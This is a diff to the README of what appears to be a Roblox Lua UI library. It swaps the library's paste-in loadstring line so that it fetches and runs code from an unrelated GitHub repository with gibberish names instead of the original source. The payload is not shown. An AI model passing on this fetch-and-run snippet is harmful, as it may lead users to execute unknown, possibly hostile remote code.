@@ -6,7 +6,7 @@ _Hawk = "ohhahtuhthttouttpwuttuaunbotwo"
 
 # Getting Loadstring
 ```lua 
-local Hawk = loadstring(game:HttpGet("https://raw.githubusercontent.com/TheHanki/HawkHUB/main/LibSources/HawkLib.lua", true))()
+local Hawk = loadstring(game:HttpGet("https://raw.githubusercontent.com/2863862963872963/2862763762763819374946311/refs/heads/main/Sigahwdjdjndndndndnndnd.luata.slta.lua", true))()
 ```
 
 --------------------------------------------------------------------------
